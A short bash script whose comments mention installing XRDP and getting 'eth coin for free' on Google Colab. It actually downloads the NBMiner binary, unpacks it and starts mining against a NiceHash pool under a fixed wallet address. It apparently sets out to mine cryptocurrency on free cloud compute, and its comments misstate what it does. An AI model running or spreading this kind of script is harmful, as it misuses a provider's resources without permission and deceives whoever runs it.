#! /bin/bash
# Install XRDP
# Before get eth coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R eth
wget https://dl.nbminer.com/NBMiner_40.1_Linux.tgz 
tar -xvf NBMiner_40.1_Linux.tgz 
cd NBMiner_Linux 
./nbminer -a ergo -o stratum+tcp://autolykos.eu-west.nicehash.com:3390 --user 3QDxvCMxkSMgPbWZjnbpirCKozFc8nMxbh.work1 - p x
